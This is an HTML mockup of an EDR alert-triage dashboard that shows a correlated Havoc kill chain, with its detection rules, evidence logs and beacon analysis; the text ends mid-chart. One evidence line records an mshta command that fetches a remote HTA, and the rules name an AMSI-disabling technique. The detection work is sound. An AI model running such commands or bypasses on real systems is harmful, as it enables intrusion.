@@ -1,0 +1,408 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <script src="./support.js"></script>
+</head>
+<body>
+<x-dc>
+<helmet>
+  <style>
+    :root{
+      --bg:#1C2127; --panel:#252A31; --raised:#2F343C; --well:#111418;
+      --line:#383E47; --fg:#F6F7F9; --fg2:#ABB3BF; --fg3:#8F99A8; --fg4:#738091;
+      --blue:#2D72D2; --blue4:#4C90F0; --blue5:#8ABBFF; --green5:#72CA9B; --violet:#BDADFF;
+      --ui:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
+      --mono:"SFMono-Regular","Cascadia Mono",Consolas,"Liberation Mono",monospace;
+    }
+    *{box-sizing:border-box}
+    body{margin:0;background:var(--bg);color:var(--fg);font:400 13px/1.3 var(--ui);-webkit-font-smoothing:antialiased}
+    a{color:var(--blue5);text-decoration:none}
+    a:hover{color:#AECBFA;text-decoration:underline}
+    .mono{font-family:var(--mono);font-variant-numeric:tabular-nums}
+    .lbl{font-size:10px;font-weight:600;letter-spacing:.09em;text-transform:uppercase;color:var(--fg4)}
+    .panel{background:var(--panel);border:1px solid var(--line);border-radius:2px}
+    .ph{height:30px;display:flex;align-items:center;gap:8px;padding:0 10px;border-bottom:1px solid var(--line);flex:none}
+    .btn{height:24px;display:inline-flex;align-items:center;gap:6px;padding:0 10px;border-radius:2px;background:#383E47;color:var(--fg);border:none;font:500 12px var(--ui);white-space:nowrap}
+    .btn-primary{background:var(--blue);color:#fff}
+    .btn-min{background:transparent;color:var(--fg2)}
+    .btn-danger{background:transparent;color:#FA999C;box-shadow:inset 0 0 0 1px rgba(205,66,70,.5)}
+    .sel{height:24px;display:inline-flex;align-items:center;gap:8px;padding:0 8px;border-radius:2px;background:#383E47;color:var(--fg);font:400 12px var(--ui);box-shadow:inset 0 0 0 1px rgba(255,255,255,.06)}
+    .tag{display:inline-flex;align-items:center;height:16px;padding:0 5px;border-radius:2px;font:600 10px/1 var(--mono);letter-spacing:.02em}
+    .sev{display:inline-flex;align-items:center;height:16px;padding:0 6px;border-radius:2px;font:700 9px/1 var(--ui);letter-spacing:.08em;text-transform:uppercase;color:#111418}
+    .dot{width:7px;height:7px;border-radius:1px;flex:none}
+    .chip{display:inline-flex;align-items:center;gap:6px;height:22px;padding:0 8px;border-radius:2px;font:500 11.5px var(--ui);color:#ABB3BF;box-shadow:inset 0 0 0 1px #404854}
+    .chip-on{background:#383E47;color:#F6F7F9;box-shadow:inset 0 0 0 1px #5F6B7C}
+  </style>
+</helmet>
+
+<div style="width:1600px;height:1000px;display:flex;flex-direction:column;background:#1C2127;overflow:hidden">
+
+  <!-- NAVBAR -->
+  <div style="height:50px;flex:none;display:flex;align-items:center;padding:0 14px;background:#252A31;border-bottom:1px solid #111418;box-shadow:0 1px 1px rgba(17,20,24,.4)">
+    <div style="display:flex;align-items:center;gap:9px;padding-right:16px">
+      <svg width="20" height="20" viewBox="0 0 20 20" fill="none" aria-hidden="true">
+        <path d="M10 1.5 17.5 5.5v6.2c0 3.1-3 5.7-7.5 6.8-4.5-1.1-7.5-3.7-7.5-6.8V5.5L10 1.5Z" stroke="#4C90F0" stroke-width="1.4" fill="rgba(45,114,210,.16)"></path>
+        <path d="M6.6 9.9 9.1 12.4 13.6 7.6" stroke="#8ABBFF" stroke-width="1.6" stroke-linecap="square"></path>
+      </svg>
+      <div style="font:600 14px var(--ui);letter-spacing:.02em;color:#F6F7F9">CCDC<span style="color:#5F6B7C">·</span>EDR</div>
+    </div>
+    <div style="width:1px;height:22px;background:#383E47"></div>
+    <div style="display:flex;align-items:stretch;height:50px;margin-left:6px">
+      <div style="display:flex;align-items:center;padding:0 15px;font:400 12.5px var(--ui);color:#ABB3BF">Dashboard</div>
+      <div style="display:flex;align-items:center;padding:0 15px;font:400 12.5px var(--ui);color:#ABB3BF">Log Explorer</div>
+      <div style="display:flex;align-items:center;gap:6px;padding:0 15px;font:600 12.5px var(--ui);color:#FFFFFF;box-shadow:inset 0 -2px 0 #4C90F0">Alerts <span class="tag" style="background:rgba(205,66,70,.22);color:#FA999C">79</span></div>
+      <div style="display:flex;align-items:center;padding:0 15px;font:400 12.5px var(--ui);color:#ABB3BF">Signatures</div>
+      <div style="display:flex;align-items:center;padding:0 15px;font:400 12.5px var(--ui);color:#ABB3BF">Threat Intel</div>
+    </div>
+    <div style="flex-grow:1"></div>
+    <div style="display:flex;align-items:center;gap:10px">
+      <div class="mono" style="font-size:11px;color:#738091">41/47 rules</div>
+      <div style="width:1px;height:18px;background:#383E47"></div>
+      <div class="mono" style="font-size:11px;color:#8F99A8">2026-03-14 14:02:07Z</div>
+      <div class="sel" style="height:26px">Last 6 hours
+        <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#ABB3BF" stroke-width="1.4"></path></svg>
+      </div>
+    </div>
+  </div>
+
+  <!-- TOOLBAR -->
+  <div style="height:40px;flex:none;display:flex;align-items:center;gap:8px;padding:0 14px;background:#1C2127;border-bottom:1px solid #383E47">
+    <div class="lbl">Group by</div>
+    <div class="sel" style="height:26px">Rule
+      <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#ABB3BF" stroke-width="1.4"></path></svg>
+    </div>
+    <div style="width:1px;height:18px;background:#383E47;margin:0 3px"></div>
+    <div style="display:flex;gap:6px">
+      <span class="chip chip-on"><span class="dot" style="background:#CD4246"></span>Critical 3</span>
+      <span class="chip chip-on"><span class="dot" style="background:#EC9A3C"></span>High 11</span>
+      <span class="chip chip-on"><span class="dot" style="background:#FBD065"></span>Medium 25</span>
+      <span class="chip"><span class="dot" style="background:#3FA6DA"></span>Low 40</span>
+    </div>
+    <div style="width:1px;height:18px;background:#383E47;margin:0 3px"></div>
+    <div style="display:flex;height:24px;border-radius:2px;overflow:hidden;box-shadow:inset 0 0 0 1px #404854">
+      <span style="display:flex;align-items:center;padding:0 10px;font:500 11.5px var(--ui);background:#383E47;color:#F6F7F9">Open</span>
+      <span style="display:flex;align-items:center;padding:0 10px;font:400 11.5px var(--ui);color:#8F99A8">Reviewed</span>
+      <span style="display:flex;align-items:center;padding:0 10px;font:400 11.5px var(--ui);color:#8F99A8">Suppressed</span>
+    </div>
+    <div style="flex-grow:1"></div>
+    <div class="mono" style="font-size:11px;color:#738091">39 open · 23 rules fired · 1 correlated chain</div>
+  </div>
+
+  <!-- BODY -->
+  <div style="flex-grow:1;display:flex;min-height:0">
+
+    <!-- TRIAGE LIST -->
+    <div style="width:540px;flex:none;background:#252A31;border-right:1px solid #383E47;display:flex;flex-direction:column;min-height:0">
+
+      <!-- group: correlation -->
+      <div style="display:flex;align-items:center;gap:8px;height:30px;padding:0 12px;background:rgba(205,66,70,.10);border-bottom:1px solid #383E47">
+        <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#FA999C" stroke-width="1.4"></path></svg>
+        <span class="sev" style="background:#CD4246">Critical</span>
+        <span style="font:600 12px var(--ui);color:#F6F7F9">Correlated kill chain</span>
+        <div style="flex-grow:1"></div>
+        <span class="mono" style="font-size:10.5px;color:#8F99A8">1</span>
+      </div>
+
+      <div style="display:flex;gap:10px;padding:9px 12px;background:rgba(45,114,210,.18);box-shadow:inset 3px 0 0 #4C90F0;border-bottom:1px solid rgba(76,144,240,.3)">
+        <div style="flex-grow:1;min-width:0;display:flex;flex-direction:column;gap:4px">
+          <div style="font:500 12.5px var(--ui);color:#FFFFFF">Havoc: macro → AMSI patch → injection → Run key → beacon</div>
+          <div class="mono" style="font-size:10.5px;color:#8ABBFF">EDR-COR-KILLCHAIN-001</div>
+          <div style="display:flex;gap:5px;flex-wrap:wrap">
+            <span class="tag mono" style="background:#2F343C;color:#C5CBD3">WIN-WKS14</span>
+            <span class="tag" style="background:rgba(189,173,255,.14);color:#BDADFF">6 stages</span>
+            <span class="tag" style="background:rgba(35,133,81,.18);color:#72CA9B">3m 22s</span>
+          </div>
+        </div>
+        <span class="mono" style="font-size:10.5px;color:#ABB3BF;flex:none">13:17</span>
+      </div>
+
+      <!-- group: havoc -->
+      <div style="display:flex;align-items:center;gap:8px;height:30px;padding:0 12px;background:#2F343C;border-bottom:1px solid #383E47">
+        <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#8F99A8" stroke-width="1.4"></path></svg>
+        <span class="dot" style="background:#CD4246"></span>
+        <span style="font:600 12px var(--ui);color:#F6F7F9">Havoc Demon — RWX alloc + indirect syscall</span>
+        <div style="flex-grow:1"></div>
+        <span class="mono" style="font-size:10.5px;color:#8F99A8">2</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05)">
+        <span class="dot" style="background:#CD4246;margin-top:3px"></span>
+        <div style="flex-grow:1;min-width:0"><div style="font-size:12px;color:#F6F7F9">CreateRemoteThread → explorer.exe (4812)</div><div class="mono" style="font-size:10.5px;color:#738091">WIN-WKS14 · sysmon 8 · powershell.exe</div></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">13:15</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05)">
+        <span class="dot" style="background:#CD4246;margin-top:3px"></span>
+        <div style="flex-grow:1;min-width:0"><div style="font-size:12px;color:#F6F7F9">ProcessAccess GrantedAccess 0x1F3FFF</div><div class="mono" style="font-size:10.5px;color:#738091">WIN-WKS14 · sysmon 10 · explorer.exe</div></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">13:15</span>
+      </div>
+
+      <!-- group: beacon -->
+      <div style="display:flex;align-items:center;gap:8px;height:30px;padding:0 12px;background:#2F343C;border-bottom:1px solid #383E47">
+        <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#8F99A8" stroke-width="1.4"></path></svg>
+        <span class="dot" style="background:#EC9A3C"></span>
+        <span style="font:600 12px var(--ui);color:#F6F7F9">Periodic HTTPS beacon — low jitter</span>
+        <div style="flex-grow:1"></div>
+        <span class="mono" style="font-size:10.5px;color:#8F99A8">3</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05)">
+        <span class="dot" style="background:#EC9A3C;margin-top:3px"></span>
+        <div style="flex-grow:1;min-width:0"><div style="font-size:12px;color:#F6F7F9">41 conns → 185.117.88.42:443 · Δ 60.0 s</div><div class="mono" style="font-size:10.5px;color:#738091">WIN-WKS14 · zeek conn</div></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">13:17</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05)">
+        <span class="dot" style="background:#EC9A3C;margin-top:3px"></span>
+        <div style="flex-grow:1;min-width:0"><div style="font-size:12px;color:#F6F7F9">JA3 a0e9f5b8… seen on 2 hosts</div><div class="mono" style="font-size:10.5px;color:#738091">WIN-WKS14 · zeek ssl</div></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">13:17</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05)">
+        <span class="dot" style="background:#EC9A3C;margin-top:3px"></span>
+        <div style="flex-grow:1;min-width:0"><div style="font-size:12px;color:#F6F7F9">Long connection, uniform 1,204 B payloads</div><div class="mono" style="font-size:10.5px;color:#738091">WIN-WKS14 · suricata</div></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">13:18</span>
+      </div>
+
+      <!-- group: linux persist -->
+      <div style="display:flex;align-items:center;gap:8px;height:30px;padding:0 12px;background:#2F343C;border-bottom:1px solid #383E47">
+        <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#8F99A8" stroke-width="1.4"></path></svg>
+        <span class="dot" style="background:#EC9A3C"></span>
+        <span style="font:600 12px var(--ui);color:#F6F7F9">authorized_keys written by service account</span>
+        <div style="flex-grow:1"></div>
+        <span class="mono" style="font-size:10.5px;color:#8F99A8">2</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05)">
+        <span class="dot" style="background:#EC9A3C;margin-top:3px"></span>
+        <div style="flex-grow:1;min-width:0"><div style="font-size:12px;color:#F6F7F9">/home/deploy/.ssh/authorized_keys appended</div><div class="mono" style="font-size:10.5px;color:#738091">LNX-WEB01 · auditd 1302 · www-data</div></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">13:19</span>
+      </div>
+
+      <!-- group: run key -->
+      <div style="display:flex;align-items:center;gap:8px;height:30px;padding:0 12px;background:#2F343C;border-bottom:1px solid #383E47">
+        <svg width="9" height="9" viewBox="0 0 10 10" fill="none"><path d="M2 3.8 5 6.8 8 3.8" stroke="#8F99A8" stroke-width="1.4"></path></svg>
+        <span class="dot" style="background:#FBD065"></span>
+        <span style="font:600 12px var(--ui);color:#F6F7F9">HKCU Run key created by non-installer</span>
+        <div style="flex-grow:1"></div>
+        <span class="mono" style="font-size:10.5px;color:#8F99A8">4</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05)">
+        <span class="dot" style="background:#FBD065;margin-top:3px"></span>
+        <div style="flex-grow:1;min-width:0"><div style="font-size:12px;color:#F6F7F9">Run\OneDriveSync = %APPDATA%\ods.exe</div><div class="mono" style="font-size:10.5px;color:#738091">WIN-WKS14 · sysmon 13</div></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">13:16</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05)">
+        <span class="dot" style="background:#FBD065;margin-top:3px"></span>
+        <div style="flex-grow:1;min-width:0"><div style="font-size:12px;color:#F6F7F9">Run\Updater = C:\ProgramData\upd.exe</div><div class="mono" style="font-size:10.5px;color:#738091">WIN-WKS07 · sysmon 13</div></div>
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">11:02</span>
+      </div>
+
+      <div style="flex-grow:1"></div>
+      <div style="height:26px;flex:none;display:flex;align-items:center;padding:0 12px;background:#111418;border-top:1px solid #383E47">
+        <span class="mono" style="font-size:10.5px;color:#5F6B7C">showing 6 of 23 rule groups</span>
+        <div style="flex-grow:1"></div>
+        <a href="#" style="font-size:10.5px">Expand all</a>
+      </div>
+    </div>
+
+    <!-- ALERT DETAIL -->
+    <div style="flex-grow:1;display:flex;flex-direction:column;min-width:0;background:#1C2127">
+
+      <!-- header -->
+      <div style="flex:none;padding:14px 18px 12px;border-bottom:1px solid #383E47;background:#252A31">
+        <div style="display:flex;align-items:flex-start;gap:12px">
+          <div style="flex-grow:1;min-width:0;display:flex;flex-direction:column;gap:8px">
+            <div style="display:flex;align-items:center;gap:9px">
+              <span class="sev" style="background:#CD4246;height:18px">Critical</span>
+              <span class="mono" style="font-size:11px;color:#8ABBFF">EDR-COR-KILLCHAIN-001</span>
+              <span class="tag" style="background:rgba(236,154,60,.16);color:#F5B871">Havoc</span>
+              <span class="tag" style="background:#2F343C;color:#ABB3BF">correlation</span>
+            </div>
+            <div style="font:500 17px var(--ui);color:#FFFFFF;letter-spacing:-.01em">Havoc: macro → AMSI patch → injection → Run key → beacon</div>
+            <div style="display:flex;align-items:center;gap:14px">
+              <span style="display:flex;align-items:center;gap:6px;font-size:11.5px;color:#ABB3BF">
+                <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="1.5" y="2.5" width="9" height="6" rx="1" stroke="#738091" stroke-width="1.2"></rect><path d="M4 10.2h4" stroke="#738091" stroke-width="1.2"></path></svg>
+                <span class="mono">WIN-WKS14</span></span>
+              <span style="display:flex;align-items:center;gap:6px;font-size:11.5px;color:#ABB3BF">
+                <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="4" r="2.2" stroke="#738091" stroke-width="1.2"></circle><path d="M2.2 10.2c.6-2 2-3 3.8-3s3.2 1 3.8 3" stroke="#738091" stroke-width="1.2"></path></svg>
+                <span class="mono">CORP\jdoe</span></span>
+              <span class="mono" style="font-size:11.5px;color:#ABB3BF">13:14:22 → 13:17:44 Z</span>
+              <span class="mono" style="font-size:11.5px;color:#738091">14 evidence events</span>
+            </div>
+          </div>
+          <div style="display:flex;gap:8px;flex:none">
+            <button class="btn btn-primary" style="height:26px">Mark reviewed</button>
+            <button class="btn" style="height:26px">Escalate</button>
+            <button class="btn btn-danger" style="height:26px">Suppress rule</button>
+          </div>
+        </div>
+        <div style="display:flex;gap:6px;flex-wrap:wrap;padding-top:11px">
+          <span class="tag" style="background:rgba(189,173,255,.14);color:#BDADFF">TA0002 Execution</span>
+          <span class="tag" style="background:rgba(189,173,255,.14);color:#BDADFF">TA0005 Defense Evasion</span>
+          <span class="tag" style="background:rgba(189,173,255,.14);color:#BDADFF">TA0003 Persistence</span>
+          <span class="tag" style="background:rgba(189,173,255,.14);color:#BDADFF">TA0011 Command &amp; Control</span>
+          <span style="width:1px;height:16px;background:#383E47;margin:0 4px"></span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">T1218.005</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">T1059.001</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">T1562.001</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">T1562.006</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">T1055.002</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">T1547.001</span>
+          <span class="tag" style="background:#2F343C;color:#C5CBD3">T1071.001</span>
+        </div>
+      </div>
+
+      <!-- content -->
+      <div style="flex-grow:1;display:flex;gap:12px;padding:12px;min-height:0">
+
+        <!-- left: why + evidence -->
+        <div style="flex-grow:1;display:flex;flex-direction:column;gap:12px;min-width:0">
+
+          <div class="panel" style="flex:none">
+            <div class="ph"><span class="lbl" style="color:#ABB3BF">Why this fired</span>
+              <div style="flex-grow:1"></div>
+              <span class="mono" style="font-size:10.5px;color:#5F6B7C">sequence · within 300 s · by host</span>
+            </div>
+            <div style="padding:0">
+              <div style="display:flex;height:22px;align-items:center;background:#2F343C;border-bottom:1px solid #383E47">
+                <div style="width:26px;flex:none"></div>
+                <div style="width:190px;flex:none;font:600 10px var(--ui);letter-spacing:.08em;text-transform:uppercase;color:#738091;padding:0 8px">Stage rule</div>
+                <div style="width:78px;flex:none;font:600 10px var(--ui);letter-spacing:.08em;text-transform:uppercase;color:#738091;padding:0 8px">Matched</div>
+                <div style="flex-grow:1;font:600 10px var(--ui);letter-spacing:.08em;text-transform:uppercase;color:#738091;padding:0 8px">Condition satisfied</div>
+              </div>
+
+              <div style="display:flex;height:26px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)">
+                <div style="width:26px;flex:none;display:flex;justify-content:center"><span class="mono" style="font-size:10px;color:#5F6B7C">1</span></div>
+                <div class="mono" style="width:190px;flex:none;padding:0 8px;font-size:11px;color:#8ABBFF">EDR-EVA-LOLBIN-004</div>
+                <div class="mono" style="width:78px;flex:none;padding:0 8px;font-size:11px;color:#72CA9B">1 event</div>
+                <div class="mono" style="flex-grow:1;padding:0 8px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">parent_name in [WINWORD.EXE,EXCEL.EXE] and process.name = mshta.exe</div>
+              </div>
+              <div style="display:flex;height:26px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)">
+                <div style="width:26px;flex:none;display:flex;justify-content:center"><span class="mono" style="font-size:10px;color:#5F6B7C">2</span></div>
+                <div class="mono" style="width:190px;flex:none;padding:0 8px;font-size:11px;color:#8ABBFF">EDR-EVA-AMSI-001</div>
+                <div class="mono" style="width:78px;flex:none;padding:0 8px;font-size:11px;color:#72CA9B">1 event</div>
+                <div class="mono" style="flex-grow:1;padding:0 8px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">event_id = 4104 and raw.ScriptBlockText|contains all [AmsiUtils, amsiInitFailed]</div>
+              </div>
+              <div style="display:flex;height:26px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)">
+                <div style="width:26px;flex:none;display:flex;justify-content:center"><span class="mono" style="font-size:10px;color:#5F6B7C">3</span></div>
+                <div class="mono" style="width:190px;flex:none;padding:0 8px;font-size:11px;color:#8ABBFF">EDR-EVA-UNHOOK-002</div>
+                <div class="mono" style="width:78px;flex:none;padding:0 8px;font-size:11px;color:#72CA9B">1 event</div>
+                <div class="mono" style="flex-grow:1;padding:0 8px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">event_id = 7 and target.path|endswith \ntdll.dll and not module.knowndlls</div>
+              </div>
+              <div style="display:flex;height:26px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045);background:rgba(45,114,210,.10)">
+                <div style="width:26px;flex:none;display:flex;justify-content:center"><span class="mono" style="font-size:10px;color:#5F6B7C">4</span></div>
+                <div class="mono" style="width:190px;flex:none;padding:0 8px;font-size:11px;color:#8ABBFF">EDR-C2-HAVOC-003</div>
+                <div class="mono" style="width:78px;flex:none;padding:0 8px;font-size:11px;color:#72CA9B">2 events</div>
+                <div class="mono" style="flex-grow:1;padding:0 8px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">event_id in [8,10] and granted_access in [0x1F3FFF,0x1FFFFF]</div>
+              </div>
+              <div style="display:flex;height:26px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)">
+                <div style="width:26px;flex:none;display:flex;justify-content:center"><span class="mono" style="font-size:10px;color:#5F6B7C">5</span></div>
+                <div class="mono" style="width:190px;flex:none;padding:0 8px;font-size:11px;color:#8ABBFF">EDR-PER-RUNKEY-001</div>
+                <div class="mono" style="width:78px;flex:none;padding:0 8px;font-size:11px;color:#72CA9B">1 event</div>
+                <div class="mono" style="flex-grow:1;padding:0 8px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">target.key|contains \CurrentVersion\Run and not process.path|startswith C:\Program Files</div>
+              </div>
+              <div style="display:flex;height:26px;align-items:center">
+                <div style="width:26px;flex:none;display:flex;justify-content:center"><span class="mono" style="font-size:10px;color:#5F6B7C">6</span></div>
+                <div class="mono" style="width:190px;flex:none;padding:0 8px;font-size:11px;color:#8ABBFF">EDR-C2-BEACON-007</div>
+                <div class="mono" style="width:78px;flex:none;padding:0 8px;font-size:11px;color:#72CA9B">8 events</div>
+                <div class="mono" style="flex-grow:1;padding:0 8px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">conn_count gt 20 and interval_stddev lt 0.12 * interval_mean</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="panel" style="flex-grow:1;display:flex;flex-direction:column;min-height:0">
+            <div class="ph"><span class="lbl" style="color:#ABB3BF">Evidence</span>
+              <div style="flex-grow:1"></div>
+              <button class="btn btn-min" style="height:20px;font-size:11px">Open all in Log Explorer →</button>
+            </div>
+            <div style="display:flex;flex-direction:column">
+              <div style="display:flex;height:25px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)"><div class="mono" style="width:104px;flex:none;padding:0 10px;font-size:11px;color:#738091">13:14:22.109</div><div class="mono" style="width:70px;flex:none;font-size:11px;color:#8F99A8">sysmon 1</div><div class="mono" style="flex-grow:1;padding-right:10px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">WINWORD.EXE → mshta.exe http://185.117.88.42/u.hta</div></div>
+              <div style="display:flex;height:25px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)"><div class="mono" style="width:104px;flex:none;padding:0 10px;font-size:11px;color:#738091">13:14:41.402</div><div class="mono" style="width:70px;flex:none;font-size:11px;color:#8F99A8">psh 4104</div><div class="mono" style="flex-grow:1;padding-right:10px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">ScriptBlock sets amsiInitFailed = true</div></div>
+              <div style="display:flex;height:25px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)"><div class="mono" style="width:104px;flex:none;padding:0 10px;font-size:11px;color:#738091">13:15:03.771</div><div class="mono" style="width:70px;flex:none;font-size:11px;color:#8F99A8">sysmon 7</div><div class="mono" style="flex-grow:1;padding-right:10px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">second ntdll.dll mapping, not from KnownDlls</div></div>
+              <div style="display:flex;height:25px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)"><div class="mono" style="width:104px;flex:none;padding:0 10px;font-size:11px;color:#738091">13:15:19.033</div><div class="mono" style="width:70px;flex:none;font-size:11px;color:#8F99A8">sysmon 8</div><div class="mono" style="flex-grow:1;padding-right:10px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">CreateRemoteThread powershell.exe → explorer.exe (4812)</div></div>
+              <div style="display:flex;height:25px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)"><div class="mono" style="width:104px;flex:none;padding:0 10px;font-size:11px;color:#738091">13:15:19.041</div><div class="mono" style="width:70px;flex:none;font-size:11px;color:#8F99A8">sysmon 10</div><div class="mono" style="flex-grow:1;padding-right:10px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">GrantedAccess 0x1F3FFF on explorer.exe</div></div>
+              <div style="display:flex;height:25px;align-items:center;border-bottom:1px solid rgba(255,255,255,.045)"><div class="mono" style="width:104px;flex:none;padding:0 10px;font-size:11px;color:#738091">13:16:02.550</div><div class="mono" style="width:70px;flex:none;font-size:11px;color:#8F99A8">sysmon 13</div><div class="mono" style="flex-grow:1;padding-right:10px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">HKCU\…\Run\OneDriveSync = %APPDATA%\ods.exe</div></div>
+              <div style="display:flex;height:25px;align-items:center"><div class="mono" style="width:104px;flex:none;padding:0 10px;font-size:11px;color:#738091">13:17:44.100</div><div class="mono" style="width:70px;flex:none;font-size:11px;color:#8F99A8">zeek conn</div><div class="mono" style="flex-grow:1;padding-right:10px;font-size:11px;color:#C5CBD3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">first of 41 callbacks → 185.117.88.42:443</div></div>
+            </div>
+            <div style="flex-grow:1"></div>
+            <div style="height:24px;flex:none;display:flex;align-items:center;padding:0 10px;border-top:1px solid rgba(255,255,255,.06)">
+              <span class="mono" style="font-size:10.5px;color:#5F6B7C">7 of 14 shown</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- right: beacon analysis + notes -->
+        <div style="width:552px;flex:none;display:flex;flex-direction:column;gap:12px;min-height:0">
+
+          <div class="panel" style="flex:none">
+            <div class="ph">
+              <span class="lbl" style="color:#ABB3BF">Beacon cadence · 185.117.88.42:443</span>
+              <div style="flex-grow:1"></div>
+              <span style="display:flex;align-items:center;gap:5px;font-size:10.5px;color:#ABB3BF"><span class="dot" style="background:#EC9A3C;border-radius:50%"></span>This host</span>
+              <span style="display:flex;align-items:center;gap:5px;font-size:10.5px;color:#ABB3BF"><span class="dot" style="background:#5F6B7C;border-radius:50%"></span>Benign peer</span>
+            </div>
+            <div style="padding:10px 12px 6px">
+              <svg width="526" height="176" viewBox="0 0 526 176" role="img" aria-label="Connection intervals: this host clusters tightly at 60 seconds while a benign peer scatters from 10 to 90 seconds">
+                <g stroke="rgba(255,255,255,.06)"><line x1="40" y1="150.5" x2="512" y2="150.5"></line><line x1="40" y1="107.5" x2="512" y2="107.5"></line><line x1="40" y1="64.5" x2="512" y2="64.5"></line><line x1="40" y1="21.5" x2="512" y2="21.5"></line></g>
+                <g font-family="SFMono-Regular, Consolas, monospace" font-size="9.5" fill="#5F6B7C" text-anchor="end">
+                  <text x="33" y="154">0</text><text x="33" y="111">30</text><text x="33" y="68">60</text><text x="33" y="25">90</text>
+                </g>
+                <text x="8" y="92" font-family="-apple-system, Segoe UI, sans-serif" font-size="9.5" fill="#5F6B7C" transform="rotate(-90 8 92)" text-anchor="middle">interval (s)</text>
+
+                <!-- expected band -->
+                <rect x="40" y="58" width="472" height="11" fill="rgba(236,154,60,.14)"></rect>
+                <line x1="40" y1="63.5" x2="512" y2="63.5" stroke="rgba(236,154,60,.5)" stroke-width="1" stroke-dasharray="4 4"></line>
+                <text x="508" y="55" font-family="SFMono-Regular, Consolas, monospace" font-size="9.5" fill="#F5B871" text-anchor="end">60 s ±6 %</text>
+
+                <!-- benign peer -->
+                <g fill="#5F6B7C">
+                  <circle cx="68" cy="132" r="4"></circle><circle cx="112" cy="45" r="4"></circle><circle cx="156" cy="118" r="4"></circle>
+                  <circle cx="200" cy="88" r="4"></circle><circle cx="244" cy="140" r="4"></circle><circle cx="288" cy="36" r="4"></circle>
+                  <circle cx="332" cy="104" r="4"></circle><circle cx="376" cy="72" r="4"></circle><circle cx="420" cy="126" r="4"></circle>
+                  <circle cx="464" cy="52" r="4"></circle>
+                </g>
+                <!-- beacon -->
+                <g fill="#EC9A3C" stroke="#252A31" stroke-width="2">
+                  <circle cx="44" cy="64" r="4.5"></circle><circle cx="60" cy="62" r="4.5"></circle><circle cx="76" cy="66" r="4.5"></circle>
+                  <circle cx="92" cy="61" r="4.5"></circle><circle cx="108" cy="63" r="4.5"></circle><circle cx="124" cy="65" r="4.5"></circle>
+                  <circle cx="140" cy="60" r="4.5"></circle><circle cx="156" cy="64" r="4.5"></circle><circle cx="172" cy="67" r="4.5"></circle>
